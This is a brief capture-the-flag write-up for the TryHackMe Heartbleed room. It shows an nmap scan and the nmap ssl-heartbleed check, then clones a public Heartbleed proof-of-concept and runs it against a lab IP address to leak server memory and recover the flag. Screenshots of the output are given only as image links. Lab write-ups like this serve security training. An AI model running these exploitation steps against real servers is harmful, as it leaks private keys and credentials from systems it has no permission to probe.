# HeartBleed

**Room Link:** [https://tryhackme.com/room/heartbleed](https://tryhackme.com/room/heartbleed)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (24) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### TCP/443 - HTTPS

We can see the site is vulnerable to heartbleed

**Kali**

```
nmap -p 443 --script ssl-heartbleed $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I had to run the exploit a couple times but eventually I found some interesting info. Most importantly the flag.

**Kali**

```
git clone https://github.com/mpgn/heartbleed-PoC.git
cd heartbleed-PoC/
python2.7 heartbleed-exploit.py 34.240.174.225
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>











